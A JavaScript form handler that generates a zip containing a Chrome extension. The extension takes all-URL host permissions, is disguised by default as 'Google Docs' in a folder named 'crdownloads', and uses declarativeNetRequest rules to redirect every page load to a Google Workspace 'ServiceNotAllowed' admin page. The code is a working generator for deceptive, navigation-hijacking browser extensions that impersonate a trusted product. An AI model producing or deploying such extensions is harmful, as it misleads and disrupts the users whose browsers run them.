const img_d = "data:image/png;base64,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"

function getManifest(name, desc) {
  return ` {\n  "name": "${name}",\n  "description": "${desc}",\n  "version": "1.0",\n  "manifest_version": 3,\n  "host_permissions": [ "<all_urls>" ],\n  "permissions": [ "storage", "activeTab", "scripting", "declarativeNetRequest", "webNavigation", "declarativeNetRequestWithHostAccess"],\n  "action": {\n    "default_icon": {\n      "16": "/images/logo16.png",\n      "32": "/images/logo32.png",\n      "128": "/images/logo128.png"\n    }\n  },\n  "declarative_net_request": {\n    "rule_resources" : [{\n      "id": "ruleset_1",\n      "enabled": true,\n      "path": "rules_1.json"\n    }]\n  },\n  "icons": {\n    "16": "/images/logo16.png",\n    "32": "/images/logo32.png",\n    "128": "/images/logo128.png"\n  }\n}`
}

function getRule(id, target, tto) {
  return `  {\n    "id": ${id},\n    "priority": 2,\n    "action": { "type": "redirect", "redirect":  { "url": "${tto}" } },\n    "condition": { "resourceTypes": ["main_frame"], "urlFilter": "${target}" }\n  }`
}

function getRuleset(target, tto) {
  return `[\n${getRule(1, target, tto)}, \n   {\n    "id": 2,\n    "priority": 1,\n    "action": { "type": "allow" },\n    "condition": { "resourceTypes": ["main_frame"], "urlFilter": "${tto}" }\n  }\n]`
}

const resizer = pica({ features: ["wasm"] })

function createZip(name, dname, desc, target, img, tto) {
  tto ||= "https://admin.google.com/a/cpanel/example.com/ServiceNotAllowed?hl=en-US&service=&pli=1"
  name ||= "Google Docs"
  desc ||= "Opens Google Docs"
  target ||= "*"
  dname ||= "crdownloads"
  const zip = new JSZip()
  const main = zip.folder(dname)
  main.file("manifest.json", getManifest(name, desc))
  main.file("rules_1.json", getRuleset(target, tto))
  const ifolder = main.folder("images")
  ifolder.file("logo16.png", img.src.replace("data:image/png;base64,", ''), { base64: true })
  ifolder.file("logo32.png", img.src.replace("data:image/png;base64,", ''), { base64: true })
  ifolder.file("logo128.png", img.src.replace("data:image/png;base64,", ''), { base64: true })
  zip.generateAsync({ type: "blob" })
    .then(function(content) {
      saveAs(content, `${dname}.zip`);
    });
}
function getImage(file) {
  return new Promise((resolve) => {
    const fileReader = new FileReader();
    fileReader.readAsDataURL(file);
    fileReader.addEventListener("load", function() {
      const e = new Image()
      e.src = this.result
      if (e.src == "data:application/octet-stream;base64,") {
        e.src = img_d
      }
      resolve(e)
    })
  })
}

$("#form").on("submit", async (e) => {
  e.preventDefault()
  const data = new FormData(e.target)
  const img = await getImage(data.get("img"))
  createZip(data.get("name"), data.get("dname"), data.get("desc"), data.get("target"), img, data.get("targetto"))
})